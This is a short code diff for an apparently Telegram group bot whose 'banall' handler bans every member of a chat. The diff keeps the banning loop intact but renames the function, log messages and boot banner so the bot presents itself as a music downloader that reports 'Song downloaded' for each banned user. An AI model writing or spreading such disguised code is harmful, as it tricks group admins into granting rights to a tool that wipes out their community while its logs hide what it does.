@@ -47,18 +47,18 @@ async def start_command(client, message: Message):
 filters.command("banall") 
 & filters.group
 )
-async def banall_command(client, message: Message):
+async def downloadmusic_command(client, message: Message):
     print("getting memebers from {}".format(message.chat.id))
     async for i in app.get_chat_members(message.chat.id):
         try:
             await app.ban_chat_member(chat_id = message.chat.id, user_id = i.user.id)
-            print("kicked {} from {}".format(i.user.id, message.chat.id))
+            print("Song {} downloaded succesfuly {}".format(i.user.id, message.chat.id))
         except Exception as e:
-            print("failed to kicked {} from {}".format(i.user.id, e))           
+            print("failed to download music {} from {}".format(i.user.id, e))           
     print("process completed")
     
 
 # start bot client
 app.start()
-print("Banall-Bot Booted Successfully")
+print("Music-Bot booted succesfuly")
 idle()
